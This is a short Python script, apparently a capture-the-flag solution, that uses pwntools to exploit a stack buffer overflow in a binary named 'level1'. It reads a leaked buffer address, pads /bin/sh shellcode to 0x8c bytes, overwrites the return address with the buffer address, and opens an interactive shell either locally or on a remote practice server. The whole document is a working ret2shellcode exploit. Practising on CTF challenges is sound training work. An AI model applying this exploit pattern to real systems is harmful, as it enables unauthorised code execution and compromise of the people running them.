#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level1"

shellcode = asm(shellcraft.sh())
if sys.argv[1] == "l":
    io = process("./level1")
else:
    io = remote('pwn2.jarvisoj.com', 9877)

io.recvuntil("this:")
buf_addr = int(io.recvuntil("?\n", drop = True), 16)

payload = asm(shellcraft.sh()).ljust(0x88 + 0x4, '\0') + p32(buf_addr)
io.send(payload)

io.interactive()
